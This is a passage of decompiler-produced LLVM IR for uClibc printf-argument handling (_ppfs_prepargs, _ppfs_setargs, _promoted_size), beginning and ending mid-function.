  br i1 %v7_c248, label %dec_label_pc_c250, label %dec_label_pc_c27c

dec_label_pc_c250:                                ; preds = %dec_label_pc_c248
  %v1_c250 = add i32 %v0_c250, 1
  %v2_c250 = inttoptr i32 %v1_c250 to i8*
  %v3_c250 = load i8, i8* %v2_c250, align 1
  %v4_c250 = zext i8 %v3_c250 to i32
  store i32 %v4_c250, i32* %r3.global-to-local, align 4
  store i32 %v1_c250, i32* %r2.global-to-local, align 4
  %v7_c254 = icmp eq i8 %v3_c250, 37
  br i1 %v7_c254, label %dec_label_pc_c27c, label %dec_label_pc_c25c

dec_label_pc_c25c:                                ; preds = %dec_label_pc_c250
  %v1_c25c = load i32, i32* @r4, align 4
  %v2_c25c = inttoptr i32 %v1_c25c to i32*
  store i32 %v1_c250, i32* %v2_c25c, align 4
  %v0_c260 = load i32, i32* @r4, align 4
  store i32 %v0_c260, i32* %r0.global-to-local, align 4
  %v1_c264 = inttoptr i32 %v0_c260 to i8*
  %v2_c264 = call i32 @_ppfs_parsespec(i8* %v1_c264)
  store i32 %v2_c264, i32* %r0.global-to-local, align 4
  %v1_c268 = icmp slt i32 %v2_c264, 0
  br i1 %v1_c268, label %dec_label_pc_c290.loopexit, label %dec_label_pc_c274

dec_label_pc_c274:                                ; preds = %dec_label_pc_c25c
  %v0_c274 = load i32, i32* @r4, align 4
  %v1_c274 = inttoptr i32 %v0_c274 to i32*
  %v2_c274 = load i32, i32* %v1_c274, align 4
  br label %dec_label_pc_c280.backedge

dec_label_pc_c27c:                                ; preds = %dec_label_pc_c248, %dec_label_pc_c250
  %v0_c27c = phi i32 [ %v0_c250, %dec_label_pc_c248 ], [ %v1_c250, %dec_label_pc_c250 ]
  %v1_c27c = add i32 %v0_c27c, 1
  br label %dec_label_pc_c280.backedge

dec_label_pc_c280.backedge:                       ; preds = %dec_label_pc_c27c, %dec_label_pc_c274
  %storemerge = phi i32 [ %v1_c27c, %dec_label_pc_c27c ], [ %v2_c274, %dec_label_pc_c274 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_c280 = inttoptr i32 %storemerge to i8*
  %v2_c280 = load i8, i8* %v1_c280, align 1
  %v3_c280 = zext i8 %v2_c280 to i32
  store i32 %v3_c280, i32* %r0.global-to-local, align 4
  %v2_c284 = icmp eq i8 %v2_c280, 0
  br i1 %v2_c284, label %dec_label_pc_c280.dec_label_pc_c28c_crit_edge, label %dec_label_pc_c248

dec_label_pc_c280.dec_label_pc_c28c_crit_edge:    ; preds = %dec_label_pc_c280.backedge
  %v0_c28c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c28c

dec_label_pc_c28c:                                ; preds = %dec_label_pc_c280.dec_label_pc_c28c_crit_edge, %dec_label_pc_c240
  %v0_c28c = phi i32 [ %v0_c28c.pre, %dec_label_pc_c280.dec_label_pc_c28c_crit_edge ], [ %v0_c240, %dec_label_pc_c240 ]
  %v1_c28c = load i32, i32* @r4, align 4
  %v2_c28c = inttoptr i32 %v1_c28c to i32*
  store i32 %v0_c28c, i32* %v2_c28c, align 4
  %v1_c298.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c290

dec_label_pc_c290.loopexit:                       ; preds = %dec_label_pc_c25c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c290

dec_label_pc_c290:                                ; preds = %dec_label_pc_c290.loopexit, %dec_label_pc_c28c
  %v1_c298 = phi i32 [ -1, %dec_label_pc_c290.loopexit ], [ %v1_c298.pre, %dec_label_pc_c28c ]
  store i32 %v3_c1fc, i32* @r4, align 4
  store i32 %v6_c1fc, i32* @r5, align 4
  ret i32 %v1_c298

; uselistorder directives
  uselistorder i32 %v3_c280, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_c240, { 1, 0, 2, 3 }
  uselistorder i32 %v4_c238, { 1, 0 }
  uselistorder i32 %v0_c234.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 5, 6, 3, 1, 7, 0 }
  uselistorder label %dec_label_pc_c27c, { 1, 0 }
  uselistorder label %dec_label_pc_c248, { 1, 0 }
  uselistorder label %dec_label_pc_c234.dec_label_pc_c234_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_c29c = load i32, i32* @r4, align 4
  store i32 %v3_c29c, i32* %stack_var_-12, align 4
  %v0_c2a0 = load i32, i32* @r0, align 4
  %v1_c2a0 = add i32 %v0_c2a0, 24
  %v2_c2a0 = inttoptr i32 %v1_c2a0 to i32*
  %v3_c2a0 = load i32, i32* %v2_c2a0, align 4
  store i32 %v3_c2a0, i32* %r5.global-to-local, align 4
  store i32 %v0_c2a0, i32* @r4, align 4
  %v2_c2b0 = add i32 %v0_c2a0, 76
  %v3_c2b0 = inttoptr i32 %v2_c2b0 to i32*
  store i32 %arg2, i32* %v3_c2b0, align 4
  %tmp5 = icmp slt i32 %v3_c2a0, 1
  br i1 %tmp5, label %dec_label_pc_c2d4, label %dec_label_pc_c2b8

dec_label_pc_c2b8:                                ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_c2bc = load i32, i32* @r0, align 4
  %v2_c2bc = add i32 %v1_c2bc, 8
  %v3_c2bc = inttoptr i32 %v2_c2bc to i32*
  store i32 0, i32* %v3_c2bc, align 4
  %v0_c2c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_c2c0 = load i32, i32* @r0, align 4
  %v2_c2c0 = add i32 %v1_c2c0, 28
  %v3_c2c0 = inttoptr i32 %v2_c2c0 to i32*
  store i32 %v0_c2c0, i32* %v3_c2c0, align 4
  %v0_c2c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_c2c4 = load i32, i32* @r0, align 4
  %v2_c2c4 = add i32 %v1_c2c4, 24
  %v3_c2c4 = inttoptr i32 %v2_c2c4 to i32*
  store i32 %v0_c2c4, i32* %v3_c2c4, align 4
  %v0_c2c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_c2c8 = load i32, i32* @r0, align 4
  %v2_c2c8 = add i32 %v1_c2c8, 4
  %v3_c2c8 = inttoptr i32 %v2_c2c8 to i32*
  store i32 %v0_c2c8, i32* %v3_c2c8, align 4
  %v0_c2cc = call i32 @_ppfs_setargs()
  store i32 %v0_c2cc, i32* @r0, align 4
  %v0_c2d0 = load i32, i32* %r5.global-to-local, align 4
  %v1_c2d0 = load i32, i32* @r4, align 4
  %v2_c2d0 = add i32 %v1_c2d0, 24
  %v3_c2d0 = inttoptr i32 %v2_c2d0 to i32*
  store i32 %v0_c2d0, i32* %v3_c2d0, align 4
  br label %dec_label_pc_c2d4

dec_label_pc_c2d4:                                ; preds = %entry, %dec_label_pc_c2b8
  %v2_c2d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c2d8, i32* @r4, align 4
  %v1_c2dc = load i32, i32* @r0, align 4
  ret i32 %v1_c2dc

; uselistorder directives
  uselistorder i32 %v0_c2a0, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_c2d4, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_c2e0 = load i32, i32* @r0, align 4
  %v1_c2e0 = add i32 %v0_c2e0, 24
  %v2_c2e0 = inttoptr i32 %v1_c2e0 to i32*
  %v3_c2e0 = load i32, i32* %v2_c2e0, align 4
  store i32 %v3_c2e0, i32* %r1.global-to-local, align 4
  %v2_c2e4 = icmp eq i32 %v3_c2e0, 0
  %v3_c2e8 = load i32, i32* @r4, align 4
  store i32 %v3_c2e8, i32* %stack_var_-8, align 4
  %v1_c2ec = add i32 %v0_c2e0, 8
  %v2_c2ec = inttoptr i32 %v1_c2ec to i32*
  %v3_c2ec = load i32, i32* %v2_c2ec, align 4
  store i32 %v3_c2ec, i32* %r3.global-to-local, align 4
  %v6_c2f4 = icmp eq i32 %v3_c2ec, -2147483648
  br i1 %v2_c2e4, label %dec_label_pc_c2f4, label %dec_label_pc_c42c

dec_label_pc_c2f4:                                ; preds = %entry
  br i1 %v6_c2f4, label %dec_label_pc_c2fc, label %dec_label_pc_c314

dec_label_pc_c2fc:                                ; preds = %dec_label_pc_c2f4
  %v1_c2fc = add i32 %v0_c2e0, 76
  %v2_c2fc = inttoptr i32 %v1_c2fc to i32*
  %v3_c2fc = load i32, i32* %v2_c2fc, align 4
  store i32 %v3_c2fc, i32* %r3.global-to-local, align 4
  %v1_c300 = inttoptr i32 %v3_c2fc to i32*
  %v2_c300 = load i32, i32* %v1_c300, align 4
  store i32 %v2_c300, i32* %r2.global-to-local, align 4
  %v1_c304 = add i32 %v3_c2fc, 4
  store i32 %v1_c304, i32* %r3.global-to-local, align 4
  store i32 %v1_c304, i32* %v2_c2fc, align 4
  %v0_c30c = load i32, i32* %r2.global-to-local, align 4
  %v1_c30c = load i32, i32* @r0, align 4
  %v2_c30c = add i32 %v1_c30c, 8
  %v3_c30c = inttoptr i32 %v2_c30c to i32*
  store i32 %v0_c30c, i32* %v3_c30c, align 4
  %v0_c310 = load i32, i32* %r2.global-to-local, align 4
  %v1_c310 = load i32, i32* @r0, align 4
  %v2_c310 = add i32 %v1_c310, 80
  %v3_c310 = inttoptr i32 %v2_c310 to i32*
  store i32 %v0_c310, i32* %v3_c310, align 4
  %v0_c314.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c314

dec_label_pc_c314:                                ; preds = %dec_label_pc_c2f4, %dec_label_pc_c2fc
  %v1_c330 = phi i32 [ %v0_c2e0, %dec_label_pc_c2f4 ], [ %v0_c314.pre, %dec_label_pc_c2fc ]
  %v1_c314 = add i32 %v1_c330, 4
  %v2_c314 = inttoptr i32 %v1_c314 to i32*
  %v3_c314 = load i32, i32* %v2_c314, align 4
  store i32 %v3_c314, i32* %r3.global-to-local, align 4
  %v6_c318 = icmp eq i32 %v3_c314, -2147483648
  %v1_c31c = add i32 %v1_c330, 80
  store i32 %v1_c31c, i32* %ip.global-to-local, align 4
  br i1 %v6_c318, label %dec_label_pc_c324, label %dec_label_pc_c33c

dec_label_pc_c324:                                ; preds = %dec_label_pc_c314
  %v1_c324 = add i32 %v1_c330, 76
  %v2_c324 = inttoptr i32 %v1_c324 to i32*
  %v3_c324 = load i32, i32* %v2_c324, align 4
  store i32 %v3_c324, i32* %r3.global-to-local, align 4
  %v1_c328 = inttoptr i32 %v3_c324 to i32*
  %v2_c328 = load i32, i32* %v1_c328, align 4
  store i32 %v2_c328, i32* %r2.global-to-local, align 4
  %v1_c32c = add i32 %v3_c324, 4
  store i32 %v1_c32c, i32* %r3.global-to-local, align 4
  store i32 %v1_c32c, i32* %v2_c324, align 4
  %v0_c334 = load i32, i32* %r2.global-to-local, align 4
  %v1_c334 = load i32, i32* @r0, align 4
  %v2_c334 = add i32 %v1_c334, 4
  %v3_c334 = inttoptr i32 %v2_c334 to i32*
  store i32 %v0_c334, i32* %v3_c334, align 4
  %v0_c338 = load i32, i32* %r2.global-to-local, align 4
  %v1_c338 = load i32, i32* @r0, align 4
  %v2_c338 = add i32 %v1_c338, 80
  %v3_c338 = inttoptr i32 %v2_c338 to i32*
  store i32 %v0_c338, i32* %v3_c338, align 4
  %v0_c41c17.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c33c

dec_label_pc_c33c:                                ; preds = %dec_label_pc_c314, %dec_label_pc_c324
  %v0_c41c17 = phi i32 [ %v1_c330, %dec_label_pc_c314 ], [ %v0_c41c17.pre, %dec_label_pc_c324 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_c340 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_c340, i32* %lr.global-to-local, align 4
  %v1_c41c18 = add i32 %v0_c41c17, 28
  %v2_c41c19 = inttoptr i32 %v1_c41c18 to i32*
  %v3_c41c20 = load i32, i32* %v2_c41c19, align 4
  store i32 %v3_c41c20, i32* %r3.global-to-local, align 4
  %v5_c42422 = icmp slt i32 %v0_c340, %v3_c41c20
  br i1 %v5_c42422, label %dec_label_pc_c348, label %dec_label_pc_c428.loopexit

dec_label_pc_c348:                                ; preds = %dec_label_pc_c33c, %dec_label_pc_c41c.backedge
  %v0_c41c24 = phi i32 [ %v0_c41c, %dec_label_pc_c41c.backedge ], [ %v0_c41c17, %dec_label_pc_c33c ]
  %v0_c35423 = phi i32 [ %v0_c354.be, %dec_label_pc_c41c.backedge ], [ %v0_c340, %dec_label_pc_c33c ]
  %v4_c348 = mul i32 %v0_c35423, 4
  %v5_c348 = add i32 %v4_c348, %v0_c41c24
  store i32 %v5_c348, i32* %r3.global-to-local, align 4
  %v1_c34c = add i32 %v5_c348, 40
  %v2_c34c = inttoptr i32 %v1_c34c to i32*
  %v3_c34c = load i32, i32* %v2_c34c, align 4
  store i32 %v3_c34c, i32* %r3.global-to-local, align 4
  %v7_c350 = icmp eq i32 %v3_c34c, 8
  %v1_c354 = add i32 %v0_c35423, 1
  store i32 %v1_c354, i32* %lr.global-to-local, align 4
  br i1 %v7_c350, label %dec_label_pc_c41c.backedge, label %dec_label_pc_c35c

dec_label_pc_c35c:                                ; preds = %dec_label_pc_c348
  %v1_c35c = add i32 %v0_c41c24, 76
  %v2_c35c = inttoptr i32 %v1_c35c to i32*
  %v3_c35c = load i32, i32* %v2_c35c, align 4
  store i32 %v3_c35c, i32* %r1.global-to-local, align 4
  %v8_c360 = icmp sgt i32 %v3_c34c, 8
  br i1 %v8_c360, label %dec_label_pc_c384, label %dec_label_pc_c364

dec_label_pc_c364:                                ; preds = %dec_label_pc_c35c
  %v7_c364 = icmp eq i32 %v3_c34c, 2
  br i1 %v7_c364, label %dec_label_pc_c3d4, label %dec_label_pc_c36c

dec_label_pc_c36c:                                ; preds = %dec_label_pc_c364
  %v8_c36c = icmp sgt i32 %v3_c34c, 2
  br i1 %v8_c36c, label %dec_label_pc_c37c, label %dec_label_pc_c370

dec_label_pc_c370:                                ; preds = %dec_label_pc_c36c
  %v1_c370 = icmp slt i32 %v3_c34c, 0
  br i1 %v1_c370, label %dec_label_pc_c408, label %dec_label_pc_c3d4

dec_label_pc_c37c:                                ; preds = %dec_label_pc_c36c
  %v7_c37c = icmp eq i32 %v3_c34c, 7
  br i1 %v7_c37c, label %dec_label_pc_c3e8, label %dec_label_pc_c408

dec_label_pc_c384:                                ; preds = %dec_label_pc_c35c
  %v7_c384 = icmp eq i32 %v3_c34c, 1024
  br i1 %v7_c384, label %dec_label_pc_c3d4, label %dec_label_pc_c38c

dec_label_pc_c38c:                                ; preds = %dec_label_pc_c384
  %v8_c38c = icmp sgt i32 %v3_c34c, 1024
  br i1 %v8_c38c, label %dec_label_pc_c3a4, label %dec_label_pc_c390

dec_label_pc_c390:                                ; preds = %dec_label_pc_c38c
  switch i32 %v3_c34c, label %dec_label_pc_c408 [
    i32 256, label %dec_label_pc_c3d4
    i32 512, label %dec_label_pc_c3d4
  ]

dec_label_pc_c3a4:                                ; preds = %dec_label_pc_c38c
  %v7_c3a4 = icmp eq i32 %v3_c34c, 2048
  br i1 %v7_c3a4, label %dec_label_pc_c3b8, label %dec_label_pc_c3b0

dec_label_pc_c3b0:                                ; preds = %dec_label_pc_c3a4
  %v1_c3ac = load i32, i32* %r4.global-to-local, align 4
  %v9_c3ac = icmp eq i32 %v3_c34c, %v1_c3ac
  br i1 %v9_c3ac, label %dec_label_pc_c3e8, label %dec_label_pc_c408

dec_label_pc_c3b8:                                ; preds = %dec_label_pc_c3a4
  %v1_c3b8 = add i32 %v3_c35c, 7
  %v1_c3bc = and i32 %v1_c3b8, -8
  store i32 %v1_c3bc, i32* %r3.global-to-local, align 4
  %v1_c3c0 = inttoptr i32 %v1_c3bc to i32*
  %v2_c3c0 = load i32, i32* %v1_c3c0, align 8
  store i32 %v2_c3c0, i32* %r1.global-to-local, align 4
  %v3_c3c0 = or i32 %v1_c3bc, 4
  %v4_c3c0 = inttoptr i32 %v3_c3c0 to i32*
  %v5_c3c0 = load i32, i32* %v4_c3c0, align 4
  store i32 %v5_c3c0, i32* %r2.global-to-local, align 4
  %v1_c3c4 = add i32 %v1_c3bc, 8
  store i32 %v1_c3c4, i32* %r3.global-to-local, align 4
  store i32 %v1_c3c4, i32* %v2_c35c, align 4
  %v0_c3cc = load i32, i32* %ip.global-to-local, align 4
  %v1_c3cc = inttoptr i32 %v0_c3cc to i32*
  %v2_c3cc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_c3cc, i32* %v1_c3cc, align 4
  %v3_c3cc = add i32 %v0_c3cc, 4
  %v4_c3cc = inttoptr i32 %v3_c3cc to i32*
  %v5_c3cc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_c3cc, i32* %v4_c3cc, align 4
  br label %dec_label_pc_c418

dec_label_pc_c3d4:                                ; preds = %dec_label_pc_c390, %dec_label_pc_c390, %dec_label_pc_c370, %dec_label_pc_c384, %dec_label_pc_c364
  %v1_c3d4 = inttoptr i32 %v3_c35c to i32*
  %v2_c3d4 = load i32, i32* %v1_c3d4, align 4
  store i32 %v2_c3d4, i32* %r2.global-to-local, align 4
  %v1_c3d8 = add i32 %v3_c35c, 4
  store i32 %v1_c3d8, i32* %r3.global-to-local, align 4
  store i32 %v1_c3d8, i32* %v2_c35c, align 4
  %v0_c3e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_c3e0 = load i32, i32* %ip.global-to-local, align 4
  %v2_c3e0 = inttoptr i32 %v1_c3e0 to i32*
  store i32 %v0_c3e0, i32* %v2_c3e0, align 4
  br label %dec_label_pc_c418

dec_label_pc_c3e8:                                ; preds = %dec_label_pc_c37c, %dec_label_pc_c3b0
  %v3_c3e8 = load i32, i32* %v2_c35c, align 4
  %v1_c3ec = add i32 %v3_c3e8, 7
  %v1_c3f0 = and i32 %v1_c3ec, -8
  store i32 %v1_c3f0, i32* %r3.global-to-local, align 4
  %v1_c3f4 = inttoptr i32 %v1_c3f0 to i32*
  %v2_c3f4 = load i32, i32* %v1_c3f4, align 8
  store i32 %v2_c3f4, i32* %r1.global-to-local, align 4
  %v3_c3f4 = or i32 %v1_c3f0, 4
  %v4_c3f4 = inttoptr i32 %v3_c3f4 to i32*
  %v5_c3f4 = load i32, i32* %v4_c3f4, align 4
  store i32 %v5_c3f4, i32* %r2.global-to-local, align 4
  %v1_c3f8 = add i32 %v1_c3f0, 8
  store i32 %v1_c3f8, i32* %r3.global-to-local, align 4
  store i32 %v1_c3f8, i32* %v2_c35c, align 4
  %v0_c400 = load i32, i32* %ip.global-to-local, align 4
  %v1_c400 = inttoptr i32 %v0_c400 to i32*
  %v2_c400 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_c400, i32* %v1_c400, align 4
  %v3_c400 = add i32 %v0_c400, 4
  %v4_c400 = inttoptr i32 %v3_c400 to i32*
  %v5_c400 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_c400, i32* %v4_c400, align 4
  br label %dec_label_pc_c418

dec_label_pc_c408:                                ; preds = %dec_label_pc_c390, %dec_label_pc_c37c, %dec_label_pc_c370, %dec_label_pc_c3b0
  %v1_c408 = add i32 %v3_c35c, 4
  store i32 %v1_c408, i32* %r3.global-to-local, align 4
  store i32 %v1_c408, i32* %v2_c35c, align 4
  %v0_c410 = load i32, i32* %r1.global-to-local, align 4
  %v1_c410 = inttoptr i32 %v0_c410 to i32*
  %v2_c410 = load i32, i32* %v1_c410, align 4
  store i32 %v2_c410, i32* %r3.global-to-local, align 4
  %v1_c414 = load i32, i32* %ip.global-to-local, align 4
  %v2_c414 = inttoptr i32 %v1_c414 to i32*
  store i32 %v2_c410, i32* %v2_c414, align 4
  br label %dec_label_pc_c418

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3e8, %dec_label_pc_c3d4, %dec_label_pc_c3b8, %dec_label_pc_c408
  %v0_c418 = load i32, i32* %ip.global-to-local, align 4
  %v1_c418 = add i32 %v0_c418, 8
  store i32 %v1_c418, i32* %ip.global-to-local, align 4
  %v0_c420.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_c41c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c41c.backedge

dec_label_pc_c41c.backedge:                       ; preds = %dec_label_pc_c418, %dec_label_pc_c348
  %v0_c41c = phi i32 [ %v0_c41c.pre, %dec_label_pc_c418 ], [ %v0_c41c24, %dec_label_pc_c348 ]
  %v0_c354.be = phi i32 [ %v0_c420.pre.pre, %dec_label_pc_c418 ], [ %v1_c354, %dec_label_pc_c348 ]
  %v1_c41c = add i32 %v0_c41c, 28
  %v2_c41c = inttoptr i32 %v1_c41c to i32*
  %v3_c41c = load i32, i32* %v2_c41c, align 4
  store i32 %v3_c41c, i32* %r3.global-to-local, align 4
  %v5_c424 = icmp slt i32 %v0_c354.be, %v3_c41c
  br i1 %v5_c424, label %dec_label_pc_c348, label %dec_label_pc_c41c.dec_label_pc_c428.loopexit_crit_edge

dec_label_pc_c42c:                                ; preds = %entry
  br i1 %v6_c2f4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_c42c
  %v2_c430 = add i32 %v0_c2e0, 36
  %v3_c430 = inttoptr i32 %v2_c430 to i8*
  %v4_c430 = load i8, i8* %v3_c430, align 1
  %v5_c430 = zext i8 %v4_c430 to i32
  %v5_c434 = mul nuw nsw i32 %v5_c430, 8
  %v6_c434 = add i32 %v5_c434, %v0_c2e0
  store i32 %v6_c434, i32* %r3.global-to-local, align 4
  %v2_c438 = add i32 %v6_c434, 72
  %v3_c438 = inttoptr i32 %v2_c438 to i32*
  %v4_c438 = load i32, i32* %v3_c438, align 4
  store i32 %v4_c438, i32* %r3.global-to-local, align 4
  store i32 %v4_c438, i32* %v2_c2ec, align 4
  %v0_c440.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c42c, %bb
  %v2_c454 = phi i32 [ %v0_c440.pre, %bb ], [ %v0_c2e0, %dec_label_pc_c42c ]
  %v1_c440 = add i32 %v2_c454, 4
  %v2_c440 = inttoptr i32 %v1_c440 to i32*
  %v3_c440 = load i32, i32* %v2_c440, align 4
  store i32 %v3_c440, i32* %r3.global-to-local, align 4
  %v6_c444 = icmp eq i32 %v3_c440, -2147483648
  br i1 %v6_c444, label %bb16, label %dec_label_pc_c428

bb16:                                             ; preds = %.thread1
  %v2_c448 = add i32 %v2_c454, 37
  %v3_c448 = inttoptr i32 %v2_c448 to i8*
  %v4_c448 = load i8, i8* %v3_c448, align 1
  %v5_c448 = zext i8 %v4_c448 to i32
  %v5_c44c = mul nuw nsw i32 %v5_c448, 8
  %v6_c44c = add i32 %v5_c44c, %v2_c454
  store i32 %v6_c44c, i32* %r3.global-to-local, align 4
  %v2_c450 = add i32 %v6_c44c, 72
  %v3_c450 = inttoptr i32 %v2_c450 to i32*
  %v4_c450 = load i32, i32* %v3_c450, align 4
  store i32 %v4_c450, i32* %r3.global-to-local, align 4
  store i32 %v4_c450, i32* %v2_c440, align 4
  %v0_c458.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c428

dec_label_pc_c41c.dec_label_pc_c428.loopexit_crit_edge: ; preds = %dec_label_pc_c41c.backedge
  br label %dec_label_pc_c428.loopexit

dec_label_pc_c428.loopexit:                       ; preds = %dec_label_pc_c41c.dec_label_pc_c428.loopexit_crit_edge, %dec_label_pc_c33c
  %v0_c41c.lcssa = phi i32 [ %v0_c41c, %dec_label_pc_c41c.dec_label_pc_c428.loopexit_crit_edge ], [ %v0_c41c17, %dec_label_pc_c33c ]
  br label %dec_label_pc_c428

dec_label_pc_c428:                                ; preds = %dec_label_pc_c428.loopexit, %.thread1, %bb16
  %v1_c478 = phi i32 [ %v0_c41c.lcssa, %dec_label_pc_c428.loopexit ], [ %v2_c454, %.thread1 ], [ %v0_c458.pre, %bb16 ]
  %v1_c458 = add i32 %v1_c478, 8
  %v2_c458 = inttoptr i32 %v1_c458 to i32*
  %v3_c458 = load i32, i32* %v2_c458, align 4
  store i32 %v3_c458, i32* %r1.global-to-local, align 4
  %v1_c45c = icmp slt i32 %v3_c458, 0
  br i1 %v1_c45c, label %dec_label_pc_c464, label %dec_label_pc_c484

dec_label_pc_c464:                                ; preds = %dec_label_pc_c428
  %v1_c464 = add i32 %v1_c478, 16
  %v2_c464 = inttoptr i32 %v1_c464 to i32*
  %v3_c464 = load i32, i32* %v2_c464, align 4
  %v1_c46c = sub i32 0, %v3_c458
  store i32 %v1_c46c, i32* %r1.global-to-local, align 4
  %v1_c468 = and i32 %v3_c464, -10
  %v1_c470 = or i32 %v1_c468, 8
  store i32 %v1_c470, i32* %r3.global-to-local, align 4
  store i32 32, i32* %r2.global-to-local, align 4
  %v2_c478 = add i32 %v1_c478, 20
  %v3_c478 = inttoptr i32 %v2_c478 to i32*
  store i32 32, i32* %v3_c478, align 4
  %v0_c47c = load i32, i32* %r1.global-to-local, align 4
  %v1_c47c = load i32, i32* @r0, align 4
  %v2_c47c = add i32 %v1_c47c, 8
  %v3_c47c = inttoptr i32 %v2_c47c to i32*
  store i32 %v0_c47c, i32* %v3_c47c, align 4
  %v0_c480 = load i32, i32* %r3.global-to-local, align 4
  %v1_c480 = load i32, i32* @r0, align 4
  %v2_c480 = add i32 %v1_c480, 16
  %v3_c480 = inttoptr i32 %v2_c480 to i32*
  store i32 %v0_c480, i32* %v3_c480, align 4
  %v1_c488.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c484

dec_label_pc_c484:                                ; preds = %dec_label_pc_c428, %dec_label_pc_c464
  %v1_c488 = phi i32 [ %v1_c478, %dec_label_pc_c428 ], [ %v1_c488.pre, %dec_label_pc_c464 ]
  %v2_c484 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c484, i32* @r4, align 4
  ret i32 %v1_c488

; uselistorder directives
  uselistorder i32 %v2_c454, { 1, 0, 2, 3 }
  uselistorder i32 %v0_c354.be, { 1, 0 }
  uselistorder i32 %v0_c41c, { 1, 2, 0 }
  uselistorder i32 %v3_c35c, { 3, 1, 0, 2, 4 }
  uselistorder i32* %v2_c35c, { 4, 2, 3, 0, 1, 5 }
  uselistorder i32 %v3_c34c, { 1, 2, 0, 8, 5, 3, 4, 7, 6, 9, 10, 11 }
  uselistorder i32 %v0_c35423, { 1, 0 }
  uselistorder i32 %v0_c41c24, { 0, 2, 1 }
  uselistorder i32 %v0_c41c17, { 2, 0, 1 }
  uselistorder i32 %v0_c2e0, { 1, 0, 4, 2, 3, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 17, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 18, 19, 20, 21, 22, 23 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 7, 3, 4, 5, 6, 8, 9, 10 }
  uselistorder label %dec_label_pc_c484, { 1, 0 }
  uselistorder label %dec_label_pc_c428, { 0, 2, 1 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_c418, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c408, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_c3e8, { 1, 0 }
  uselistorder label %dec_label_pc_c3d4, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_c348, { 1, 0 }
  uselistorder label %dec_label_pc_c33c, { 1, 0 }
  uselistorder label %dec_label_pc_c314, { 1, 0 }
}

define i32 @_promoted_size() local_unnamed_addr {
entry:
  %v1_c4ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %dec_label_pc_c4b4, %entry
  %v0_c4a8 = phi i32 [ %v1_c4a8, %dec_label_pc_c4b4 ], [ add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38826), %entry ]
  %v1_c4a8 = add i32 %v0_c4a8, -2
  %v2_c4a8 = inttoptr i32 %v1_c4a8 to i16*
  %v3_c4a8 = load i16, i16* %v2_c4a8, align 2
  %v4_c4a8 = sext i16 %v3_c4a8 to i32
  store i32 %v1_c4a8, i32* @ip, align 4
  %v9_c4ac = icmp eq i32 %v4_c4a8, %v1_c4ac.pre
  br i1 %v9_c4ac, label %dec_label_pc_c4a8.dec_label_pc_c4bc_crit_edge, label %dec_label_pc_c4b4

dec_label_pc_c4a8.dec_label_pc_c4bc_crit_edge:    ; preds = %dec_label_pc_c4a8
  br label %dec_label_pc_c4bc

dec_label_pc_c4b4:                                ; preds = %dec_label_pc_c4a8
  %tmp = icmp ugt i32 %v1_c4a8, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38850)
  br i1 %tmp, label %dec_label_pc_c4a8, label %dec_label_pc_c4bc.loopexit

dec_label_pc_c4bc.loopexit:                       ; preds = %dec_label_pc_c4b4
  br label %dec_label_pc_c4bc

dec_label_pc_c4bc:                                ; preds = %dec_label_pc_c4bc.loopexit, %dec_label_pc_c4a8.dec_label_pc_c4bc_crit_edge
  %v2_c4cc.pre-phi = sub i32 %v1_c4a8, add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 -38850)
